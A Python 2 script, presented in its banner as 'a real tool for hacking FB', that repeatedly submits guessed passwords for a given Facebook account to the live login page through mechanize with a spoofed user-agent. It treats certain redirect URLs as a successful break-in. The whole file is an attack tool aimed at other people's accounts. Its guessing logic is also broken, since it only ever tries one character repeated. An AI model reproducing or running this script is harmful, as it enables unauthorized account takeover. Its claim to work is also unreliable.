import random
import sys
import time
import os
import mechanize




def cls():
    linux = 'clear'
    windows = 'cls'                    
    os.system([linux,windows][os.name == 'nt'])                                       

cls()                                  

os.system(['','color D'][os.name == 'nt'])

if len(sys.argv) != 3:
   print 'USE:[+] python2 fbhacking.py [id_facebook]  [lenght_password]'
   sys.exit()
           
username  = sys.argv[1]
l = int(sys.argv[2])

print ''' USE:[+] python2 fbhacking.py [id_facebook]  [lenght_password]
          [@] A REAL TOOL FOR HACKING FB
          [+] TIME IS SHORT 
          [+] FOUNDER : MZOIR ZAKARIYA 
          [+] FACEBOOK :
          [+] DATE : 14/07/2019
          [+] NAME: FACEBOOK-PASSWORD-GENERATOR-FOR-HACKING
'''


word = ['a','b','c','d','z','r','t','y','u','i','o','p','q','s','d','f','g','h','j','k','l','m','w','x','v','n','1','2','3','4','5','6','7','8','9','0','@','_','#','.']

while True:
 x= random.choice(word)*l
 print 'password={}'.format(x)
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.addheaders = [('User-agent',''' Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36''')]
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 br.open(login)
 br.select_form(nr=0)
 br.form['email'] = username
 br.form['pass'] = '{}'.format(x)
 d =br.submit()
 i = d.geturl()                             
 print i
 if 'save-device' in i or 'm_session' in i or 'checkpoint' in i:
          print 'GOOD LUCK THAT YOUR PASSWORD:[({})]'.format(x)

                     
